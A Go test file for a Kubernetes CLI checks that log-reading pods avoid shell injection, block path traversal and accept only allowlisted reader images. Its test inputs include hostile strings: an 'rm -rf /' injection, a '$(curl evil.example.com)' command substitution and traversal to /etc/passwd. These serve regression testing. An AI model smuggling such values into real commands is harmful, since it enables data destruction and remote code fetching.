/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package cli

import (
	"strings"
	"testing"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	paddockv1alpha1 "github.com/tjorri/paddock/api/v1alpha1"
)

// Earlier versions built the reader pod's Command via
// `sh -c "cat %q"`, which was vulnerable to shell injection when the
// user-supplied --file path contained command substitution or other
// shell metacharacters. The fix is to skip the shell entirely and pass
// the path as a distinct argv element. These tests lock that contract
// in.
func TestNewReaderPod_CommandAvoidsShell(t *testing.T) {
	cases := []struct {
		name, filePath string
	}{
		{"plain path", "/workspace/.paddock/runs/r1/events.jsonl"},
		{"path with shell metacharacters", "/workspace/foo; rm -rf /"},
		{"path starting with dash", "-rf /etc"},
		{"path with command substitution", `/workspace/$(curl evil.example.com)`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pod := newReaderPod("p", "ns", "pvc", "busybox:1.37", tc.filePath)
			if len(pod.Spec.Containers) != 1 {
				t.Fatalf("expected 1 container, got %d", len(pod.Spec.Containers))
			}
			cmd := pod.Spec.Containers[0].Command
			if len(cmd) != 3 {
				t.Fatalf("expected 3-element Command (cat -- <path>); got %#v", cmd)
			}
			if cmd[0] != "cat" {
				t.Errorf("Command[0] = %q, want \"cat\" — a shell must not be invoked", cmd[0])
			}
			if cmd[1] != "--" {
				t.Errorf("Command[1] = %q, want \"--\" — missing flag terminator lets leading-dash paths be interpreted as flags", cmd[1])
			}
			if cmd[2] != tc.filePath {
				t.Errorf("Command[2] = %q, want %q — path must be a distinct argv element", cmd[2], tc.filePath)
			}
		})
	}
}

func TestResolvedPathFile(t *testing.T) {
	run := &paddockv1alpha1.HarnessRun{ObjectMeta: metav1.ObjectMeta{Name: "r1"}}

	cases := []struct {
		name    string
		file    string
		wantErr bool
		want    string
	}{
		{"absolute under workspace", "/workspace/foo.log", false, "/workspace/foo.log"},
		{"workspace root", "/workspace", false, "/workspace"},
		{"path-traversal", "/workspace/../etc/passwd", true, ""},
		{"absolute outside workspace", "/etc/passwd", true, ""},
		{"relative path", "raw.jsonl", true, ""},
		{"double-slash and dot are cleaned", "/workspace//foo/./bar", false, "/workspace/foo/bar"},
		{"workspace prefix sibling not allowed", "/workspaceother/foo", true, ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			o := &logsOptions{file: tc.file}
			got, err := o.resolvedPath(run)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("expected error for file=%q, got %q", tc.file, got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error for file=%q: %v", tc.file, err)
			}
			if got != tc.want {
				t.Errorf("got %q, want %q", got, tc.want)
			}
		})
	}
}

func TestResolvedPathSelectorsUnchanged(t *testing.T) {
	run := &paddockv1alpha1.HarnessRun{ObjectMeta: metav1.ObjectMeta{Name: "r1"}}

	cases := []struct {
		name string
		o    logsOptions
		want string
	}{
		{"events default", logsOptions{}, "/workspace/.paddock/runs/r1/events.jsonl"},
		{"raw", logsOptions{raw: true}, "/workspace/.paddock/runs/r1/raw.jsonl"},
		{"result", logsOptions{result: true}, "/workspace/.paddock/runs/r1/result.json"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := tc.o.resolvedPath(run)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tc.want {
				t.Errorf("got %q, want %q", got, tc.want)
			}
		})
	}
}

func TestValidateReaderImage(t *testing.T) {
	cases := []struct {
		name    string
		image   string
		extra   []string
		wantErr bool
	}{
		// Default-allowlisted prefixes
		{"default digest-pinned busybox", "busybox:1.37@sha256:" + strings.Repeat("a", 64), nil, false},
		{"bare busybox", "busybox", nil, false},
		{"busybox tag", "busybox:1.37", nil, false},
		{"docker.io qualified", "docker.io/library/busybox:1.37", nil, false},
		{"k8s registry", "registry.k8s.io/pause:3.10", nil, false},

		// Rejections
		{"unknown registry", "evil.example.com/img:latest", nil, true},
		{"boundary check (no separator)", "busybox-evil:tag", nil, true},
		{"empty", "", nil, true},
		{"prefix sibling not allowed", "registry.k8s.io.evil.com/img", nil, true},

		// Override flag
		{"extra prefix accepted", "ghcr.io/myorg/foo:v1", []string{"ghcr.io/myorg/"}, false},
		{"extra prefix doesn't match siblings", "ghcr.io/other/foo:v1", []string{"ghcr.io/myorg/"}, true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateReaderImage(tc.image, tc.extra)
			if tc.wantErr && err == nil {
				t.Fatalf("expected error for image=%q extra=%v", tc.image, tc.extra)
			}
			if !tc.wantErr && err != nil {
				t.Fatalf("unexpected error for image=%q extra=%v: %v", tc.image, tc.extra, err)
			}
		})
	}
}

func TestDefaultReaderImageDigestPinned(t *testing.T) {
	// Belt-and-braces guard so a future tag-only edit fails CI.
	if !strings.Contains(defaultReaderImage, "@sha256:") {
		t.Fatalf("defaultReaderImage = %q; expected digest-pinned (image:tag@sha256:<64-hex>)", defaultReaderImage)
	}
	at := strings.LastIndex(defaultReaderImage, "@sha256:")
	hex := defaultReaderImage[at+len("@sha256:"):]
	if len(hex) != 64 {
		t.Fatalf("defaultReaderImage digest hex = %q (length %d); expected 64 hex chars", hex, len(hex))
	}
}
